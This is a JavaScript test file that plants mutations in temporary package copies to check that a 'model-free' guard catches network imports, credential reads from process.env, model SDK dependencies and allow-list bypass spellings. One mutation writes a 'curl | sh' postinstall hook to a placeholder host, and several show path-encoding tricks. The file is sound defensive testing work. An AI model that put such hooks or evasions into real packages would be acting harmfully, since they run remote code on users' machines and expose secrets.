// F2 — BEHAVIOURAL MUTATION CONTROLS for the model/credential-free guard.
//
// THE FINDING. `gate-is-model-free.test.mjs` claimed a broad shipped property and checked two
// dependency fields and four exact spellings. Three ordinary, independently-controlled violations
// were planted in the SHIPPED tree at 555546d9 and the complete suite stayed at 138 pass / 0 fail
// with all four of that file's tests green:
//
//   1. `const loadNetworkClient = async () => import('node:https')` in src/verify.mjs
//   2. `const { OPENAI_API_KEY } = process.env` in the same file
//   3. `optionalDependencies: { "openai": "*" }` in package.json
//
// TO BE EXPLICIT ABOUT WHAT THIS IS AND IS NOT: the shipped tree is genuinely model-free and
// dependency-free, before and after this change. Nothing here fixes production code, because
// nothing in production code was wrong. The defect was in the TESTS — they were narrower than the
// property they claimed to protect — and so the fix is in the tests.
//
// WHY THIS FILE EXISTS SEPARATELY FROM THE ASSERTIONS IT PROVES. "The audit returns a violation"
// is a weaker claim than "a named test goes red", and only the second is what a reviewer relies on.
// So each mutation is applied to a REAL COPY of this package on disk, the model-free suite is run
// against the copy in a child process, and the assertion is on TAP `not ok <n> - <name>`. This is
// the harness idiom already established by delete-guards.test.mjs, for the two reasons stated
// there and repeated because both are easy to get wrong:
//
//   - IT READS TAP, NOT PROSE. `output.includes(name)` matches the PASSING line for a test as
//     happily as the failing one, so a harness written that way accepts a mutant that broke some
//     unrelated test instead.
//   - IT CLEARS NODE_TEST_CONTEXT. node:test marks its worker with that variable; inherited by a
//     nested `node --test`, the child behaves as part of the parent run and a red mutant exits 0.
//
// Each mutation is INTRODUCED and then REMOVED: the copy is deleted in a finally block, and the
// unmutated-copy control below re-runs the same suite on an unmodified copy and requires it green.
// That is what makes "this mutation caused this failure" a measurement rather than an assumption.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import {
  appendFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { copyPackage } from './helpers/copy-package.mjs';
import { auditShippedSurface } from './shipped-surface.mjs';

const PACKAGE = dirname(fileURLToPath(new URL('../package.json', import.meta.url)));
const SUITE = join('test', 'gate-is-model-free.test.mjs');

// The named tests in gate-is-model-free.test.mjs. Held here as literals so that renaming a test
// without revisiting its mutation control fails loudly instead of quietly measuring nothing.
const NAMED = {
  surface: 'the audit sees the whole shipped surface, derived from package.json `files`',
  manifest: 'the shipped gate installs nothing: every dependency-bearing manifest field is empty',
  module: 'no shipped source file loads a module outside the allow-list',
  env: 'no shipped source file reads an environment variable outside the QUORUM_ namespace',
  global: 'no shipped source file uses a network-capable global or a code-loading escape',
  unreadable: 'no shipped source file contains a construct the audit cannot read',
  backstop: 'the real shipped tree is clean: the audit finds nothing at all',
};

function tapFailures(output) {
  return output
    .split('\n')
    .filter((line) => /^not ok \d+ - /.test(line.trim()))
    .map((line) => line.trim().replace(/^not ok \d+ - /, ''));
}

/** Run the model-free suite inside `dir` and return the names of the tests that reported `not ok`. */
function runSuiteIn(dir) {
  const env = { ...process.env, QUORUM_MUTATION_CHILD: '1' };
  delete env.NODE_TEST_CONTEXT;
  let output;
  try {
    output = execFileSync(process.execPath, ['--test', '--test-reporter=tap', SUITE], {
      cwd: dir, encoding: 'utf8', env, timeout: 120_000,
    });
  } catch (error) {
    output = `${error.stdout ?? ''}${error.stderr ?? ''}`;
  }
  assert.match(output, /^1\.\.\d+$/m, `the child produced no TAP plan, so nothing was measured:\n${output}`);
  return tapFailures(output);
}

/** Copy the package, apply `mutate`, run the suite, and always remove the copy afterwards. */
function withMutation(label, mutate) {
  const dir = mkdtempSync(join(tmpdir(), 'quorum-f2-'));
  try {
    copyPackage(PACKAGE, dir);
    mutate(dir);

    // The mutation must actually be present before anything is concluded from the child's output;
    // a string replace that silently did nothing would otherwise read as "the guard is fine".
    const { violations } = auditShippedSurface(dir);
    assert.ok(violations.length > 0, `${label}: the mutation did not land — the audit sees nothing`);

    return runSuiteIn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

const appendToShipped = (text) => (dir) => appendFileSync(join(dir, 'src', 'verify.mjs'), `\n${text}\n`, 'utf8');

const editManifest = (mutate) => (dir) => {
  const path = join(dir, 'package.json');
  const pkg = JSON.parse(readFileSync(path, 'utf8'));
  mutate(pkg);
  writeFileSync(path, `${JSON.stringify(pkg, null, 2)}\n`, 'utf8');
};

// Every mutation F2 requires covered, plus the three it actually demonstrated. The
// `expect` field names the test that must go red; the backstop is expected alongside it and is
// declared as redundant rather than counted as a second detector.
const MUTATIONS = [
  {
    label: 'F2 reproduction 1 — dynamic import of a network builtin',
    expect: NAMED.module,
    apply: appendToShipped(`const loadNetworkClient = async () => import('node:https');\nexport const __mutation = loadNetworkClient;`),
  },
  {
    label: 'F2 reproduction 2 — process.env destructuring of a credential',
    expect: NAMED.env,
    apply: appendToShipped(`const { OPENAI_API_KEY } = process.env;\nexport const __mutation = OPENAI_API_KEY;`),
  },
  {
    label: 'F2 reproduction 3 — optionalDependencies',
    expect: NAMED.manifest,
    apply: editManifest((pkg) => { pkg.optionalDependencies = { openai: '*' }; }),
  },
  {
    // round 2: the classifier recognised `process.env` but not the equivalent bracket
    // spelling of the ROOT, `process['env']`. Exact reproduction from the review — this export can
    // read a credential outside the QUORUM_ namespace and every named test stayed green until the
    // env form keyed on the root rather than the literal-dot spelling.
    label: 'review reproduction — process[\'env\'] bracket-root access to a credential',
    expect: NAMED.env,
    apply: appendToShipped(`export const __codex143ReviewProbe = () => process['env'].OPENAI_API_KEY;`),
  },
  {
    label: 'peerDependencies',
    expect: NAMED.manifest,
    apply: editManifest((pkg) => { pkg.peerDependencies = { openai: '*' }; }),
  },
  {
    label: 'bundleDependencies (an ARRAY, not an object — the shape a name-list check misses)',
    expect: NAMED.manifest,
    apply: editManifest((pkg) => { pkg.bundleDependencies = ['openai']; }),
  },
  {
    // Not one of the three F2 demonstrated, and found while widening the rule: a
    // postinstall hook runs on a consumer's machine before any of our code does, so no amount of
    // auditing src/ would ever see it.
    label: 'a postinstall script, which runs network-capable code no source check can see',
    expect: NAMED.manifest,
    apply: editManifest((pkg) => { pkg.scripts.postinstall = 'curl -s https://example.invalid | sh'; }),
  },
  {
    label: 'a lockfile, meaning a dependency was installed however the manifest reads',
    expect: NAMED.manifest,
    apply: (dir) => writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3}\n', 'utf8'),
  },
  {
    label: 'a bare (non node:-prefixed) builtin import',
    expect: NAMED.module,
    apply: appendToShipped(`import https from 'https';\nexport const __mutation = https;`),
  },
  {
    label: 'require() of a network builtin',
    expect: NAMED.module,
    apply: appendToShipped(`export const __mutation = () => require('node:net');`),
  },
  {
    // test/ and tools/ are published but not audited (shipped-surface.mjs PUBLISHED_OUTSIDE_THE_GATE),
    // so the gate reaching into them would load unaudited code; the relative import itself is refused.
    label: 'the gate importing from test/, which is published outside the gate and not audited',
    expect: NAMED.module,
    apply: appendToShipped(`import { build } from '../test/helpers/bundle.mjs';\nexport const __mutation = build;`),
  },
  {
    label: 'a model SDK import',
    expect: NAMED.module,
    apply: appendToShipped(`import OpenAI from 'openai';\nexport const __mutation = OpenAI;`),
  },
  {
    label: 'createRequire — a route around the module allow-list',
    expect: NAMED.module,
    apply: appendToShipped(`import { createRequire } from 'node:module';\nexport const __mutation = createRequire;`),
  },
  {
    label: 'a computed process.env read, whose key cannot be read lexically',
    expect: NAMED.unreadable,
    apply: appendToShipped(`const key = 'OPENAI_API_KEY';\nexport const __mutation = process.env[key];`),
  },
  {
    label: 'a rest-destructure of process.env, which names no variable at all',
    expect: NAMED.unreadable,
    apply: appendToShipped(`const { ...everything } = process.env;\nexport const __mutation = everything;`),
  },
  {
    label: 'a dynamic import whose specifier is a variable',
    expect: NAMED.unreadable,
    apply: appendToShipped(`const spec = 'node:https';\nexport const __mutation = () => import(spec);`),
  },
  {
    label: 'a fetch() call, which no import check can see',
    expect: NAMED.global,
    apply: appendToShipped(`export const __mutation = () => fetch('https://example.invalid');`),
  },
  {
    label: 'new Function(), which would defeat every other rule in the audit',
    expect: NAMED.global,
    apply: appendToShipped(`export const __mutation = new Function('return 1');`),
  },
  {
    label: 'a NEWLY-ADDED shipped source path, declared in package.json `files`',
    expect: NAMED.module,
    apply: (dir) => {
      mkdirSync(join(dir, 'lib'), { recursive: true });
      writeFileSync(join(dir, 'lib', 'net.mjs'), `export const call = async () => import('node:https');\n`, 'utf8');
      editManifest((pkg) => { pkg.files = [...pkg.files, 'lib']; })(dir);
    },
  },
  {
    label: 'a new file inside an ALREADY-shipped directory',
    expect: NAMED.module,
    apply: (dir) => writeFileSync(join(dir, 'src', 'net.mjs'), `import { request } from 'node:https';\nexport const call = request;\n`, 'utf8'),
  },
  {
    label: 'deleting the `files` allow-list, which publishes the whole directory unaudited',
    expect: NAMED.surface,
    apply: editManifest((pkg) => { delete pkg.files; }),
  },
];

for (const mutation of MUTATIONS) {
  test(`F2 mutation: ${mutation.label} reddens "${mutation.expect}"`, {
    skip: process.env.QUORUM_MUTATION_CHILD === '1' ? 'mutation child' : false,
    timeout: 120_000,
  }, () => {
    const failed = withMutation(mutation.label, mutation.apply);
    assert.ok(failed.includes(mutation.expect),
      `expected "${mutation.expect}" to report not ok; the suite failed: ${JSON.stringify(failed)}`);
    // The backstop is expected to fall too. Asserted rather than tolerated, so the declared
    // redundancy in gate-is-model-free.test.mjs stays true instead of drifting into a dead test.
    assert.ok(failed.includes(NAMED.backstop), `the clean-tree backstop stayed green under: ${mutation.label}`);
  });
}

// THE PUBLISHED-OUTSIDE-THE-GATE BOUNDARY, for EACH excluded directory and every spelling Node
// accepts for it. Each control plants a module, re-exports it from src/index.mjs under one spelling,
// and requires three results from the same copy: the model-free suite reddens the module test by
// name; the audit refuses it for the REASON that spelling should trigger (so each branch of the rule
// is pinned on its own, not covered by whichever later branch also happens to fire); and Node itself,
// importing src/index.mjs, executes the planted module and returns the sentinel. The last result is
// what shows the spelling is live — a control whose import Node could not resolve would prove nothing.
// A bare self-reference through the package NAME is not covered by a control because Node cannot
// reach test/ or tools/ that way (no `exports` entry names them); the module allow-list refuses it.
const SENTINEL = 'quorum-boundary-sentinel';
const PROBE = 'export const boundaryProbe = process.env.QUORUM_BOUNDARY_SENTINEL;\n';
const rewritten = (dir) => `rewrites to ${dir}/boundary-probe.mjs`;
const notAllowed = 'which is not in the shipped module allow-list';
const BOUNDARY_SPELLINGS = [
  { label: 'the plain relative path', spell: (dir) => `../${dir}/boundary-probe.mjs`, reason: (dir) => `which resolves into ${dir}/ — published outside the gate` },
  { label: 'percent-encoding', spell: (dir) => `../%${dir.charCodeAt(0).toString(16)}${dir.slice(1)}/boundary-probe.mjs`, reason: rewritten },
  { label: 'a backslash separator', spell: (dir) => `../${dir}\\\\boundary-probe.mjs`, reason: (dir) => `rewrites to ${dir}/` },
  { label: 'a tab the URL parser deletes', spell: (dir) => `../${dir.slice(0, 2)}\t${dir.slice(2)}/boundary-probe.mjs`, reason: rewritten },
  { label: 'an absolute file: URL', spell: (dir, root) => pathToFileURL(join(root, dir, 'boundary-probe.mjs')).href, reason: () => notAllowed },
  {
    label: 'a package #imports self-reference', spell: () => '#boundary-probe', reason: () => notAllowed,
    manifest: (pkg, dir) => { pkg.imports = { '#boundary-probe': `./${dir}/boundary-probe.mjs` }; },
  },
];

function nodeLoadsProbe(dir) {
  const env = { ...process.env, QUORUM_BOUNDARY_SENTINEL: SENTINEL };
  delete env.NODE_TEST_CONTEXT;
  return execFileSync(process.execPath, ['--input-type=module', '-e',
    "const m = await import('./src/index.mjs'); console.log(m.boundaryProbe);"], { cwd: dir, encoding: 'utf8', env }).trim();
}

/** Plant via `plant(dir)`, re-export `specifier` from src/index.mjs, and check all three results. */
function boundaryControl(label, plant, specifier, reason) {
  let loaded;
  let reasons;
  const failed = withMutation(label, (dir) => {
    plant(dir);
    appendFileSync(join(dir, 'src', 'index.mjs'), `\nexport { boundaryProbe } from '${specifier(dir)}';\n`, 'utf8');
    loaded = nodeLoadsProbe(dir);
    reasons = auditShippedSurface(dir).violations.map((violation) => violation.reason);
  });
  assert.equal(loaded, SENTINEL, `${label}: Node did not load the planted module, so this control proves nothing`);
  assert.ok(reasons.some((why) => why.includes(reason)), `${label}: expected a refusal containing ${JSON.stringify(reason)}; got ${JSON.stringify(reasons)}`);
  assert.ok(failed.includes(NAMED.module), `expected "${NAMED.module}" to report not ok; the suite failed: ${JSON.stringify(failed)}`);
  assert.ok(failed.includes(NAMED.backstop), `the clean-tree backstop stayed green under ${label}`);
}

const childSkip = { skip: process.env.QUORUM_MUTATION_CHILD === '1' ? 'mutation child' : false, timeout: 120_000 };

for (const excluded of ['test', 'tools']) {
  for (const spelling of BOUNDARY_SPELLINGS) {
    test(`F2 boundary: src/ importing ${excluded}/ through ${spelling.label} reddens "${NAMED.module}", and Node really loads it`, childSkip, () => {
      boundaryControl(`${excluded} via ${spelling.label}`, (dir) => {
        writeFileSync(join(dir, excluded, 'boundary-probe.mjs'), PROBE, 'utf8');
        if (spelling.manifest) editManifest((pkg) => spelling.manifest(pkg, excluded))(dir);
      }, (dir) => spelling.spell(excluded, dir), spelling.reason(excluded));
    });
  }
}

test(`F2 boundary: src/ importing an UNPUBLISHED in-package module reddens "${NAMED.module}", and Node really loads it`, childSkip, () => {
  boundaryControl('unpublished in-package module', (dir) => {
    mkdirSync(join(dir, 'scratch'));
    writeFileSync(join(dir, 'scratch', 'boundary-probe.mjs'), PROBE, 'utf8');
  }, () => '../scratch/boundary-probe.mjs', 'which resolves to scratch/boundary-probe.mjs, a file this audit does not read');
});

test(`F2 boundary: src/ importing a module OUTSIDE the package reddens "${NAMED.module}", and Node really loads it`, childSkip, () => {
  // A sibling of the package copy, so the import climbs out of the package root.
  const outside = mkdtempSync(join(tmpdir(), 'quorum-f2-outside-'));
  try {
    writeFileSync(join(outside, 'boundary-probe.mjs'), PROBE, 'utf8');
    boundaryControl('module outside the package', () => {}, () => `../../${basename(outside)}/boundary-probe.mjs`, 'which resolves outside the package');
  } finally {
    rmSync(outside, { recursive: true, force: true });
  }
});

test('F2 control: an UNMUTATED copy of the package is green', {
  skip: process.env.QUORUM_MUTATION_CHILD === '1' ? 'mutation child' : false,
  timeout: 120_000,
}, () => {
  // Without this every mutation test above would still pass if the harness itself were broken —
  // a child that always fails "detects" everything and measures nothing. This is also the half of
  // "introduce, then remove" that shows removal restores green.
  const dir = mkdtempSync(join(tmpdir(), 'quorum-f2-control-'));
  try {
    copyPackage(PACKAGE, dir);
    assert.deepEqual(auditShippedSurface(dir).violations, []);
    assert.deepEqual(runSuiteIn(dir), []);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('F2: every named test in the model-free suite has at least one mutation control', () => {
  // The gap that produced this finding was a claim with no behavioural backing. This makes an
  // unprotected assertion impossible to add quietly: a new named test with no mutation reddens
  // here, and the backstop is named as the one deliberate exception.
  const covered = new Set(MUTATIONS.map((mutation) => mutation.expect));
  const uncovered = Object.entries(NAMED)
    .filter(([key, name]) => key !== 'backstop' && !covered.has(name))
    .map(([, name]) => name);
  assert.deepEqual(uncovered, []);

  const suite = readFileSync(join(PACKAGE, SUITE), 'utf8');
  const declared = [...suite.matchAll(/^test\('((?:[^'\\]|\\.)*)'/gm)].map((match) => match[1].replace(/\\'/g, "'"));
  assert.deepEqual(declared.sort(), Object.values(NAMED).sort(),
    'the model-free suite declares a test this file does not know about — add a mutation for it');
});
